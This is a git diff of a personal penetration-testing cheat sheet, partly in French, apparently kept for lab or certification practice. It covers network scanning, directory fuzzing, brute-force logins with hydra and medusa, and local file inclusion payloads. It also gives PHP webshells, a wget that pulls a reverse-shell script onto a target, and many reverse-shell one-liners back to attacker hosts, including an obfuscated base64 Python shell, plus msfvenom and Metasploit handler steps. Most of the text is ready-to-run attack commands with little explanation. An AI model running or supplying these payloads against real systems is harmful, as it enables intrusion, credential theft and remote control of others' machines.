@@ -2,391 +2,623 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20an
 https://tools.kali.org/tools-listing
 
 
+# Reconnaisance
 
-==PATH
-/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
-export PATH=/tmp:$PATH
+## Scan IP
+```bash
+
+sudo netdiscover -i vboxnet0 -r 192.168.110.0/24
+fping --quiet --alive --generate 192.168.110.0/24
+sudo nmap -PE -sn -n 192.168.110.0/24
+sudo nmap -sP 192.168.110.0/24
+
+```
+
+```bash
+
+#bash scan_ip.sh
+
+for ip in $(seq 1 254); do
+ping -c 1 192.168.110.$ip | grep "bytes from" | cut -d " " -f 4 | cut -d ":" -f 1 &
+done
 
 
-==Web Applications
-    -dirb
-    -gobuster
-    -wfuzz
-        wfuzz -c -z file,/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404 --hs "Under" http://192.168.110.38/FUZZ.php
-        wfuzz -c -z file,/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404 --hs "Under" http://192.168.110.48/FUZZ/
-    -niko -h 192.168.110.48
-    -uniscan
 
-    ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://192.168.110.48/FUZZ/
-    ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.10.10/FUZZ -e php,html -or -of md -o results.md
-    dirsearch.py -u http://192.168.110.48 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e txt,php -f -x 400,403,404 
 
-# Gobuster 3
-gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.110.48 -x html,php -t 20
-gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.10.10 -x html,php -k
+```
+```bash
+
+for ip in 1 192.168.110.{1..254}; do ping -c 1 $ip > /dev/null && echo "${ip} is up"; done
+
+```
+```bash
+
+#!/bin/bash
+TF=$(mktemp -u)
+touch $TF
+is_alive_ping()
+{
+  ping -c 1 $1 > /dev/null
+  [ $? -eq 0 ] && echo Node with IP: $i is up. >> $TF
+}
+
+for i in 192.168.0.{1..254} 
+do
+is_alive_ping $i & disown
+done
+sleep 1
+cat $TF
+rm $TF
+
+
+```
+
+
+## Open ports inbound
+
+
+```bash
+
+for i in $(seq 1 65535); do nc -z -v 192.168.3.50 $i 2>&1 | grep 'open'; done
+for i in $(seq 1 65535); do nc -nvz -w 1 192.168.212.4 $i 2>&1; done | grep -v "refused"
+
+```
+
+
+## open port outbound
+
+    #Top ports nmap -oG - -v --top-ports 10
+    bttai@debian:~/OSCP/boxes/sickos$ cat ping.sh 
+    ports="21 22 23 25 80 110 443 8080 8443"
+    for port in $(seq 0 9000); do
+        nc -lvp $port > /dev/null 2>&1 &
+        #ls -al > /dev/null 2>&1 &
+        nc_pid=$!
+        echo $port
+        cmd="nc -z -w 1 192.168.158.1 $port && echo '$port connexion successful'
+           #    || echo '$port connexion failed'"
+        #echo $cmd
+        
+        curl -G --data-urlencode "c=$cmd" --url http://192.168.158.133/test/cmd.php
+        #nc -z -w 1 192.168.158.1 $port && echo "successful" || echo "failed"
+        
+        kill $nc_pid 2>/dev/null
+    done
+
+
+
+
+
+sudo nmap -n -Pn -p- -O 192.168.110.54
+sudo nmap -n -Pn -sV -p21,22,80 -O 192.168.110.54
+sudo nmap -n -Pn -sV --script default -p21,22,80 -O 192.168.110.54
+
+
+## Scan Web services
+
+nikto -h http://192.168.110.54
+gobuster
+    -f, --add-slash
+    -x, --extension
+    -u, --url string
+    -k, --no-tls-validation
+    -w, --wordlist string
+
+    gobuster dir --url 192.168.110.54  --wordlist directory-list-2.3-medium.txt -x html,php,txt -t 20
+
+dirb http://192.168.110.54 -X .php,.txt
+wfuzz
+    -c Output with colors
+    -z payload
+    --hc/hl/hw/hh N[,N]+ : Hide responses with the specified code/lines/words/chars (Use BBB for taking values from baseline)
+    --sc/sl/sw/sh N[,N]+ : Show responses with the specified code/lines/words/chars (Use BBB for taking values from baseline)
+    --ss/hs regex   : Show/hide responses with the specified regex within the content
+
+    wfuzz -c -z file,directory-list-2.3-medium.txt --hc 404 --hs "Under" http://192.168.110.38/FUZZ.php
+    wfuzz -c -z file,directory-list-2.3-medium.txt --hc 404 --hs "Under" http://192.168.110.48/FUZZ/
+
+ffuf -c -w directory-list-2.3-medium.txt -u http://192.168.110.48/FUZZ/
+ffuf -c -w directory-list-2.3-medium.txt -u http://10.10.10.10/FUZZ -e php,html -or -of md -o results.md
+
+    -b : Cookie data `"NAME1=VALUE1; NAME2=VALUE2"`
+    -c : Colorize output
+    -w : Wordlist file path
+    -u : Target URL
+    -d : POST data
+
+dirsearch.py -u http://192.168.110.48 -w directory-list-2.3-medium.txt -e txt,php -f -x 400,403,404 
 
 curl -v http://10.10.10.10/robots.txt
 curl -k -v https://10.10.10.10/robots.txt
 curl -A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" http://10.10.10.10/robots.txt
-
 curl -v -X OPTIONS http://10.10.10.10/test
 
+#Identifier les méthodes HTTP autorisées
+curl -X OPTIONS http://example.org -i
 
 
+### WordPress
 
-===Transfer file with nc
-1) reciever
-    nc -l -p 1234 -q 1 > archive.tar.gz < /dev/null
-    nc -l -p 1234 -q 1 | uncompress -c | tar xvfp -
-    nc -l -p 1234  -q 1 | gunzip > asroot
-    nc -l -p 1234  -q 1 | tar zxv
-    nc 10.0.1.1 1234 > linpeas.sh
+wpscan --url http://192.168.110.54/wp
+wpscan --url http://192.168.110.54/wp --enumerate u
+wpscan --url http://192.168.110.54/wp --usernames users.txt --passwords passwords.txt --password-attack xmlrpc
+wpscan --url http://192.168.110.54/wp --plugins-version-detection aggressive --plugins-detection aggressive  --detection-mode aggressive
 
-
-3) sender
-    cat archive.tar.gz | nc a.b.c.d 1234
-    tar cfp - /some/dir | compress -c |  nc a.b.c.d 1234
-    gzip -c /tmp/asroot | nc a.b.c.d 1234
-    tar czp /tmp/directory | nc a.b.c.d 1234
-    nc -l -p 1234 -q 1 < linpeas.sh 
-
-==transfer file xxd, base64
-    
-    xxd -p -c 36 binary
-    head binary.xxd
-    7f454c460101010000000000000000000200030001000000c08604083400
-    cat binary.xxd | xxd -r -p > binary
-
-    base64 -w 0 binary
-    echo -ne f0VMRgEBAQAAAAAAAAAAAAIAAwABA... | base64 -d > binary
-
-===Tar file
-1) create
-    tar -czvf file.tar.gz /path/to/dir1
-2) list the contents of a tar file
-    tar -ztvf file.tar.gz
-3) extract a tar flile
-   1> tar -xvf file.tar.gz
-   2> tar -xzvf file.tar.gz
-   3> tar -xzvf file.tar.gz -C /tmp/
-
-===Version 
-uname -a
-lsb_release -a
-cat /etc/release
-cat /etc/*release
-cat /etc/issue
-cat /etc/os-release
-hostnamectl
-
-===update shell
-python -c 'import pty; pty.spawn("/bin/sh")'
-python3.6 -c 'import pty; pty.spawn("/bin/sh")'
-
-
-===knock port
-
-for x in 4000 5000 6000; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x server_ip_address; done
-
-
-
-
-for PORT in $PORT1 $PORT2 $PORT3; do nc -vz $SSH_HOST $PORT; done; ssh $SSH_USER@SSH_HOST
-
-
-nc 192.168.1.102 4000
-nc 192.168.1.102 5000
-nc 192.168.1.102 6000
-
-https://github.com/grongor/knock/blob/master/knock
-
-=== copy file
-base64 -w 0 file 
-echo "..." | base64 -d > file
-
-===Display available network interfaces
-ip link show
-nmcli device status / nmcli connection show
-netstat -i
-ifconfig -a
-===Routing table
-ip r
-=== ARP cache
-arp 
-arp -a
-arp -e
-arp -n
-
-===Crypt - uncrypt
-https://hashes.com/en/decrypt/hash
-cyberchef : gchq.github.io
-http://rumkin.com/tools
-
-
-=== spawning shells
-https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/
-#1
-nc <attacker_ip> <port> -e /bin/bash
-#2
-mknod backpipe p; nc <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
-#3
-/bin/bash -i > /dev/tcp/<attacker_ip>/<port> 0<&1 2>&1
-<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.1.1/1234 0>&1'"); ?>
-#4
-mknod backpipe p; telnet <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
-
-RHOST=attacker.com
-RPORT=12345
-TF=$(mktemp -u)
-mkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF
-
-#5
-telnet <attacker_ip> <1st_port> | /bin/bash | telnet <attacker_ip> <2nd_port>
-#7
-wget -O /tmp/bd.php <url_to_malicious_file> && php -f /tmp/bd.php
-
-=== Write in some sensitive file
-find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq
-
-for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
-
-===spawn shell
-
-https://netsec.ws/?p=337
-https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method2usingsocat%20target=
-
-python -c 'import pty; pty.spawn("/bin/sh")'
-echo os.system('/bin/bash')
-/bin/sh -i
-perl -e 'exec "/bin/sh";'
-
-perl - exec "/bin/sh";
-
-ruby - exec "/bin/sh"
-
-lua - os.execute('/bin/sh')
-IRB - exec "/bin/sh"
-
-vi - :!bash
-
-vi - :set shell=/bin/bash:shell
-
-nmap - !sh
-
-=== Server
-python3 -m http.server 8888 --directory /home/kali/OSPC/Tools/
-
-
-=== Check privilegessocat TCP-LISTEN:1234,reuseaddr,for
-
-http://www.securitysift.com/download/linuxprivchecker.py
-https://github.com/cervoise/linuxprivcheck
-https://github.com/rebootuser
-
-===port forwarding 
-
-==== Socat
-
-socat TCP-LISTEN:<<Straylight_TCP_PORT>>,fork,reuseaddr TCP:<<Neuromancer_IP_address>>:<<Neuromancer_TCP_PORT>> &
-socat TCP-LISTEN:8009,fork,reuseaddr TCP:192.168.212.4:8009 &
-
-==== ssh
-ssh -N -f  -L 8080:internalTarget:80 user@compromisedMachine
-ssh -N -f  -L 8080:internalTarget:22 user@compromisedMachine
-ssh -N -f -R 8080:127.0.0.1:8080 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null kali@192.168.110.1 -i key
-
-kali> ssh -N -f -L 9000:cible.ip:22 root@pivot.ip
-
-pivot> ssh -N -f -R 2222:cible.ip:22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null kali@attacker.ip 
-
-==== Meterpreter session
-
-portfwd add -l 3306 -p 3306 -r 172.28.128.3
-portfwd list
-portfwd flush
-
-    
-
-
-===detecte open ports
-
-for i in $(seq 1 65535); do nc -nvz -w 1 192.168.212.4 $i 2>&1; done | grep -v "refused"
-
-for i in $(seq 1 65535); do nc -nvz -w 1 127.0.0.1 $i 2>&1; done | grep -v "refused"
-===netstat
-netstat -i
-netstat -antp | grep 1234
-netstat -lnp tcp
-
-
-==
-
-
-
-bash -i> /dev/tcp/192.168.110.1/4444 0>&1
-
-set payload php/meterpreter/reverse_tcp
-
-
-
-===msfvenom
-
-https://www.hackingarticles.in/generating-reverse-shell-using-msfvenom-one-liner-payload/
-https://null-byte.wonderhowto.com/how-to/elevate-netcat-shell-meterpreter-session-for-more-power-control-0193211/
-https://pravinponnusamy.medium.com/reverse-shell-payloads-969366fa5aff
-
-msfvenom -a x86 --platform linux -p linux/x86/exec -f py -b '\x0d\x0a\x00\xff' CMD=/bin/sh PrependSetresuid=true
-
-
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o rev &>/dev/null
-
-
-msfvenom -p cmd/unix/reverse_bash lhost=192.168.1.103 lport=1111 R
-0<&21-;exec 21<>/dev/tcp/192.168.110.1/443;sh <&21 >&21 2>&21
-
-msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.1 lport=443 R
-mkfifo /tmp/fond; nc 192.168.1.1 443 0</tmp/fond | /bin/sh >/tmp/fond 2>&1; rm /tmp/fond
-msfvenom -p cmd/unix/reverse_netcat_gaping lhost=192.168.1.1 lport=443 R
-nc 192.168.1.1 443 -e /bin/sh
-
-msfvenom -p cmd/unix/reverse_perl lhost=192.168.1.1 lport=443 R
-perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"192.168.1.1:443");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
-
-msfvenom -p cmd/unix/reverse_python lhost=192.168.1.1 lport=443 R
-python -c "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCAgICAgICAgLCAgICBzdWJwcm9jZXNzICAgICAgICAsICAgIG9zICAgICA7ICAgIGhvc3Q9IjE5Mi4xNjguMS4xIiAgICAgOyAgICBwb3J0PTQ0MyAgICAgOyAgICBzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQgICAgICAgICwgICAgc29ja2V0LlNPQ0tfU1RSRUFNKSAgICAgOyAgICBzLmNvbm5lY3QoKGhvc3QgICAgICAgICwgICAgcG9ydCkpICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICAgLCAgICAwKSAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAgICAgICwgICAgMSkgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpICAgICAgICAsICAgIDIpICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==')[0]))"
-
-msfvenom -p cmd/unix/reverse_ruby lhost=192.168.1.1 lport=443 R
-ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.1.1","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
-
-
-
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.20.128 LPORT=4444 -a x64 --platform linux -f elf -o rev
-msfvenom --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.110.1 LPORT=4444 -f elf -a x86 -o rev
-
-
-=== Meterpreter
-
-msfvenom --platform linux --arch x86 --payload linux/x86/meterpreter/reverse_tcp LHOST=192.168.110.1 LPORT=4444 --format elf --out rev
-
-msf6 > use exploit/multi/handler 
-msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
-msf6 exploit(multi/handler) > set LHOST 192.168.110.1
-msf6 exploit(multi/handler) > run
-
-
-msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.110.1 LPORT=4444 -f raw -o rev.php
-
-msf6 > use exploit/multi/handler 
-msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
-msf6 exploit(multi/handler) > set LHOST 192.168.110.1
-msf6 exploit(multi/handler) > run
-
-
-msf6 > use exploit/multi/handler
-msf6 exploit(multi/handler) > set payload linux/x86/shell_reverse_tcp
-msf6 exploit(multi/handler) > set LHOST 192.168.110.1
-msf6 exploit(multi/handler) > run
-
-nc 192.168.110.1 4444 -e /bin/sh
-
-
-
-=== Shell
-
-https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
-
-msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.110.1 LPORT=4444 -f elf > shell-x86.elf
-
-use exploit/multi/handler
-msf6 exploit(multi/handler) > set payload linux/x86/shell/reverse_tcp
-msf6 exploit(multi/handler) > set LHOST 192.168.110.1
-msf6 exploit(multi/handler) > run
-
-
-
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.110.1 LPORT=4444 -a x64 --platform linux -f elf -o rev
-msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.110.1 LPORT=4444 -a x86 --platform linux -f elf -o rev
-msfvenom -p php/meterpreter/reverse_tcp LHOST=172.16.227.1 LPORT=443 -o shell.php
-
-msfvenom --platform linux -p linux/x86/meterpreter/reverse_tcp -f elf -a x86 -o rev1
-
-
-=====Tomcat
-
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.1 LPORT=1234 -f war > update.war
-msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.20.128 LPORT=4444 -f war -o evil.war
-
-
-
-cd /usr/share/metasploit-framework/modules/payloads/singles/cmd/unix
-
-
-===SMB
-https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/
-
-enum4linux 192.168.110.46
-nmblookup -A 192.168.1.17
-nbtscan 192.168.1.17
-nbtstat -A 192.168.1.17
-smbmap -H 192.168.110.46
-smbmap -H 192.168.110.46 -u helios -p qwerty
-
-smbclient -L 192.168.110.46
-smbclient //192.168.110.46/helios
-get file.txt
-
-smbclient //10.10.10.9/share$
-
-
-smbclient //192.168.110.46/helios -U helios
-Enter WORKGROUP\helios's password: 
-Try "help" to get a list of possible commands.
-smb: \> ls
-smb: \> mask ""
-smb: \> recurse ON
-smb: \> prompt OFF
-smb: \> mget *
-
-
-Password Cracking
-https://www.hackingarticles.in/password-crackingsmb/
-Hydra
-hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.118 smb
-hydra -e nsr -u -l <username> -P passwd.txt 192.168.1.105 smb -V -f
-Ncrack
-ncrack –U /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.118 –p 445
-Medusa
-medusa -h 192.168.1.118 -U /root/Desktop/user.txt -P /root/Desktop/pass.txt -M smbnt
-medusa -u <username> -P passwd.txt -h 192.168.1.105 -M smbnt
-
-Metasploit
-use auxiliary/scanner/smb/smb_login
-msf exploit (smb_login)>set rhosts 192.168.1.118
-msf exploit (smb_login)>set user_file /root/Desktop/user.txt
-msf exploit (smb_login)>set pass_file /root/Desktop/pass.txt
-msf exploit (smb_login)>set stop_on_success true
-msf exploit (smb_login)>exploit
-
-===Wordpress
-$P$BZ9cvCg4NZMOtHvOEhxws.wSX6/OX7. : 123456
-
-
-===
-msf5 > use exploit/multi/script/web_delivery
-msf5 exploit (multi/script/web_delivery) > set target 1
-msf5 exploit (multi/script/web_delivery) > set payload php/meterpreter/reverse_tcp
-msf5 exploit (multi/script/web_delivery) > set lhost 192.168.1.105
-msf5 exploit (multi/script/web_delivery) > exploit
-
-
-===Joomla
+### Drupal
 
 droopescan
 
+### Joomla
 
-=Bash
+joomscan
 
-==Bash boucle immit command line, curl post request
+
+
+
+## Identifier les vulnérabilités
+
+sudo nmap -n -Pn -sV --script vuln,exploit -p21,22,80 -O 192.168.110.54
+searchsploit
+
+
+
+# Tools
+
+hydra -t 4 -L users.txt -P passwords.txt ssh://192.168.110.54
+
+telnet
+
+netcat
+ncat
+socat : https://github.com/andrew-d/static-binaries
+pwncat
+john
+hashcat
+hash : mimikatz / craclmapexec
+ pass de hash
+
+wordslist
+passwords reuse
+
+## sed
+
+```console
+
+# garder seulement le texte entre <pre> text </pre>
+sed 's/<pre>/<pre>\n/g' 
+sed -n '/<xxxxx/,/<\/xxxxx/p'
+sed -n '/<div id="footer"/,/<\/div/p'
+# delete @ at the begining of lines
+sed 's/^@\(.*\)/\1/' 
+# Supprimer toutes les balises
+sed -e 's/<[^>]*>//g'
+sed 's/<\/\?[^>]\+>//g'
+# Supprimer la première ligne et la dernière ligne
+sed -r -e '1d' -e '$d' -e 's/^\s+//'
+# Supprimer tout sauf entre 2 balises
+sed '/<div class="content">/,/<\/div>/!d'
+sed -n '/<div class="content">/,/<\/div/p'
+```
+
+curl
+
+Tar file
+    # create
+    tar -czvf file.tar.gz /path/to/dir1
+    
+    # list the contents of a tar file
+    tar -ztvf file.tar.gz
+    
+    # extract a tar flile
+    tar -xvf file.tar.gz
+    tar -xzvf file.tar.gz
+    tar -xzvf file.tar.gz -C /tmp/
+
+
+
+## Steganography
+
+exiftool
+steghide
+    steghide embed -ef <txt filename> -cf <media filename>
+    steghide extract -sf <media filename>
+    steghide embed -ef <txt filename> -cf <media filename> -p  <password>
+    steghide info <media filename>
+stepic -d -i kvasir.png | xxd -p -r > k.png
+
+
+## tcpdump
+https://danielmiessler.com/study/tcpdump/
+
+sudo tcpdump -i vboxnet0 icmp -X
+tcpdump host 1.1.1.1
+tcpdump src 1.1.1.1
+tcpdump dst 1.0.0.1
+tcpdump net 1.2.3.0/24
+tcpdump -c 1 -X icmp
+tcpdump port 3389
+tcpdump portrange 21-23
+-X : Show the packet’s contents in both hex and ASCII.
+-c : Only get x number of packets and then stop.
+
+
+# Exploit LFI
+
+
+## Detection of PHP include
+
+    - a parent directory can be added: include("includes/".$_GET["page"]);;
+    - a file extension can be added: include($_GET["page"].".php");;
+    - the value can be sanitized: include(basename($_GET["page"]));;
+    - or all of the previous actions can be performed include("includes/".basename($_GET["page"]).".php");.
+
+## Exploitation of local file include
+
+- inject the PHP code in the web server log
+- inject the PHP code in an email
+- upload a file and including it, you can for example upload an image and put your PHP code in the image's comment section (so it won't get modify if the image is resized).
+- upload the PHP code via another service: FTP, NFS, ...
+- what extension can be uploaded;
+- what content type can be uploaded
+
+
+https://highon.coffee/blog/lfi-cheat-sheet/
+
+
+## Null Byte (encoded as %00)
+
+    http://vulnerable/index.php?page=../../../../../etc/passwd%00
+
+## Upload fake file
+
+https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
+
+```bash
+
+#cat shell.pdf 
+%PDF-1.5
+<?php system($_GET["cmd"]); ?>
+
+```
+   
+
+## Path Traversal aka Directory Traversal
+
+    /etc/passwd
+    ../../../etc/passwd
+
+## PHP Wrapper expect:// LFI
+
+    http://127.0.0.1/fileincl/example1.php?page=expect://ls
+
+
+## PHP Wrapper php://file
+http://192.168.183.128/fileincl/example1.php?page=php://input
+
+Post Data payload, try something simple to start with like: 
+    - <? system('uname -a');?>
+    - <? system('wget http://192.168.183.129/php-reverse-shell.php -O /var/www/shell.php');?>
+
+## PHP Wrapper php://filter
+
+http://192.168.155.131/fileincl/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
+
+## /proc/self/environ LFI Methodology%20and%20Resources
+
+    User Agent
+    /proc/self/environ
+
+
+## /proc/self/fd/ LFI Method
+
+    referer
+    /proc/self/fd/ e.g. /proc/self/fd/2, /proc/self/fd/10 etc
+
+
+
+# Remote file access
+
+    http://vulnerable/index.php?page=http://www.google.com/?
+
+## exploit
+
+http://vulnerable/index.php?page=http://yourserver/webshell.txt&cmd=ifconfig
+
+```php    
+#webshell.txt
+<?php
+  system($_GET["cmd"]);
+?>
+```
+# Exploit - Remote Commande execution (RCE)
+
+    ;
+    &
+    &&
+    |
+    ||
+    ;
+    0x0a, \n
+    `command`
+    $(command)
+    ; command ;
+    ;; command ;;
+
+
+# Post-exploitation
+
+## Transfert de fichiers
+
+    wget
+    curl
+    xxd
+    od
+    base64
+
+
+
+## Elévation de privilèges (privilege escalation) privEsc
+    
+    sudo -l
+    sudo /bin/bash -p
+    fichier texte
+    notes
+    mail
+    mouvement latéral
+    pivoting
+
+### Tools
+https://www.hackingarticles.in/linux-privilege-escalation-automated-script/
+
+
+LinPEAS : https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
+
+    -s (superfast & stealth): This will bypass some time-consuming checks and will leave absolutely no trace.
+    -P (Password): Pass a password that will be used with sudo -l and Bruteforcing other users
+    -h Help Banner
+    -o Only execute selected checks
+    -d <IP/NETMASK> Discover hosts using fping or ping
+    ip <PORT(s)> -d <IP/NETMASK> Discover hosts looking for TCP open ports using nc
+
+LinEnum : https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+
+    -k Enter keyword
+    -e Enter export location
+    -t Include thorough (lengthy) tests
+    -s Supply current user password to check sudo perms (INSECURE)
+    -r Enter report name
+    -h Displays help text
+
+LES: Linux Exploit Suggester https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
+
+LinuxPrivChecker : https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
+
+Metasploit: Local_Exploit_Suggester
+
+    msf6 > use exploit/multi/handler
+    msf6 exploit(multi/handler) > set lhost 192.168.0.13
+    msf6 exploit(multi/handler) > set payload generic/shell_reverse_tcp
+    # or
+    msf6 exploit(multi/handler) > set payload set payload linux/x86/shell_reverse_tcp
+
+    msf6 exploit(multi/handler) > run
+
+    nc 192.168.0.13 4444 -e /bin/sh
+    
+    ^Z
+    Background session 1? [y/N]  y
+    msf6 exploit(multi/handler) > sessions  -u 1
+    msf6 exploit(multi/handler) > sessions 2
+    
+    ^Z
+    meterpreter > 
+    Background session 2? [y/N]
+    
+    msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
+    msf6 post(multi/recon/local_exploit_suggester) > set SESSION 2
+    use post/multi/recon/local_exploit_suggester
+    msf6 post(multi/recon/local_exploit_suggester) > run
+
+
+pspy : https://github.com/DominicBreuker/pspy it allows you to see commands run by other users, cron jobs, etc
+
+
+# Forensics
+
+```bash
+find / -perm -u=s -type f 2>/dev/null
+find / -perm -g=s -type f 2>/dev/null
+find / -type f -writable 2>/dev/null | grep -v '^/proc'| grep -v '^/sys'
+find / -user root -writable 2>/dev/null | grep -v '/proc' | grep -v '/dev'
+
+find  /home -name ".bash_history" 2>/dev/null -exec cat {} \;
+for file in $(find . -name '*.php'); do cat $file; done
+
+grep -Er '(preg_replace|phpinfo()|system)' * | grep '.php:'
+
+```
+
+## Persistance
+    
+    cron, command and control
+
+## Effacement de trace
+
+## Bind et Reverse shell
+    
+### Bin shell
+
+    connexion ssh
+    nc 1234 -e /bin/sh
+
+### Reverse shell
+
+    # attacker
+    nc -nlvp 1234
+
+    # victime
+    # netcat
+    nc <attacker_ip> 1234 -e /bin/bash
+
+    # netcat with GAPING_SECURITY_HOLE disabled
+    mknod backpipe p; nc <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
+
+    # without netcat
+    /bin/bash -i > /dev/tcp/<attacker_ip>/<port> 0<&1 2>&1
+
+    # use  telnet
+    mknod backpipe p; telnet <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
+    
+    TF=$(mktemp -u)
+    mkfifo $TF && telnet <attacker_ip> <port> 0<$TF | /bin/sh 1>$TF
+
+
+    # telnet-to-telnet
+    nc -nlvp <port1>
+    nc -nlvp <port2>
+    telnet <attacker_ip> <port1> | /bin/bash | telnet <attacker_ip> <port2>
+    
+    # PHP reverse shell via interactive console
+    wget -O /tmp/bd.php <url_to_malicious_file> && php -f /tmp/bd.php
+
+    # socat
+    # attacker
+    socat file:`tty`,raw,echo=0 tcp-listen:<port>
+
+    # victim:
+    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attacker_ip>:<port>
+
+
+    # msfvenom https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
+
+    # Binaries payload
+
+    #Staged payload
+    msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -a x86 -f elf > shell-x86.elf
+    msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -a x64 -f elf > shell-x64.elf
+
+    #Stageless Payloads
+    msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
+    msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
+
+
+
+    # Web Payloads
+    msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
+    jsp msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
+    war msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
+    php msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
+
+
+
+### Use msfvenom to generate reverse shell command
+
+https://www.hackingarticles.in/generating-reverse-shell-using-msfvenom-one-liner-payload/
+    
+    msfvenom -p cmd/unix/reverse_perl lhost=192.168.1.1 lport=443 R
+    perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"192.168.1.1:443");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
+
+    msfvenom -p cmd/unix/reverse_python lhost=192.168.1.1 lport=443 R
+    python -c "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCAgICAgICAgLCAgICBzdWJwcm9jZXNzICAgICAgICAsICAgIG9zICAgICA7ICAgIGhvc3Q9IjE5Mi4xNjguMS4xIiAgICAgOyAgICBwb3J0PTQ0MyAgICAgOyAgICBzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQgICAgICAgICwgICAgc29ja2V0LlNPQ0tfU1RSRUFNKSAgICAgOyAgICBzLmNvbm5lY3QoKGhvc3QgICAgICAgICwgICAgcG9ydCkpICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICAgLCAgICAwKSAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAgICAgICwgICAgMSkgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpICAgICAgICAsICAgIDIpICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==')[0]))"
+
+    msfvenom -p cmd/unix/reverse_netcat lhost <attacker_ip> lpost <port> R
